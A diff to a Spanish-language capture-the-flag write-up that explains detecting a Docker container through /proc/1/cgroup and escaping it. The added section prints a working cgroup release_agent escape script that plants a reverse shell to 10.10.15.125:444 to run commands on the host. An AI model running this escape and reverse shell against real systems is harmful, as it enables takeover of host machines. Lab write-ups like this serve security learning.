@@ -110,7 +110,7 @@ Una vez que ya estoy dentro de la maquina como el usuario **git** me dirijo a la
 
 Ya que tenemos las credenciales de **root** entramos a su directorio personal y vemos que la **flag** de root no esta, lo que genera sospechas ya que podriamos estar en un **Doker**, ya que el mismo **linpeas** nos dio informacion que no puedo dar muchas pistas de esto mismo y agregar que el comando **ifconfig**, **ip -a** no estaban habilitados o disponibles en la maquina.
 
-Una prueba que podemos ver si estamos en un **Contenedor-Doker** haciendo un **cat** a la ruta ```/proc/1/cgroup```.
+Una prueba que podemos ver si estamos en un **Contenedor-Doker** es haciendo un **cat** a la ruta ```/proc/1/cgroup```.
 
 cgroups significa "grupos de control". Es una característica de Linux que aísla el uso de recursos y es lo que Docker utiliza para aislar los contenedores. Puedes saber si estás en un contenedor comprobando el grupo de control del proceso init en /proc/1/cgroup. Si no estás dentro de un contenedor, el grupo de control debería ser /. Por otro lado, si estás dentro de un contenedor, deberías ver /docker/CONTAINER_ID en su lugar.
 
@@ -120,4 +120,34 @@ cgroups significa "grupos de control". Es una característica de Linux que aísl
 
 Ya que sabemos que estamos en un **Docker** buscando en internet como escapar de un contenedor me encuentro con un articulo el cual explica el como poder escapar de estos mismo.
 
-En el articulo explican que para poder escapar tenemos que ver si el contenedor tiene algun privilegio establecido para ver esto usamos el comando ```--privileged``` y si
+En el articulo explican que para poder escapar tenemos que ver si el contenedor tiene algun privilegio establecido para ver esto usamos el comando ```#ip link add dummy0 type dummy ```  esto se hace ya que este comando requiere la capacidad **NET_ADMIN**, que el contenedor tendría si tiene privilegios y si este comando se ejecuta con éxito, puede concluir que el contenedor tiene la capacidad **NET_ADMIN**.
+
+En este caso ya que el comando **ip** esta desabilitado no podemos hacer la prueba pero en el mismo articulo nos explican como podriamos ejecutar comandos en la maquina host estando dentro del contenedor, se seguiria los siguientes comandos:
+
+```
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
+echo '#!/bin/bash' > /cmd
+echo " bash -i >& /dev/tcp/10.10.15.125/444 0>&1> $host_path/output" >> /cmd <-- Insertamos la revershell
+chmod a+x /cmd
+
+bash -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+Ya ejecutado estas sentencia de comando vemos que efectivamente pudimos salir del docker ejecutando comandos en la maquina host.
+
+<p align="center">
+<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/ready/intrusion/root.png">
+</p>
+
+
+## Referencias
+
+https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1
+
+https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
+
+https://www.youtube.com/watch?v=_dhONyAk4es
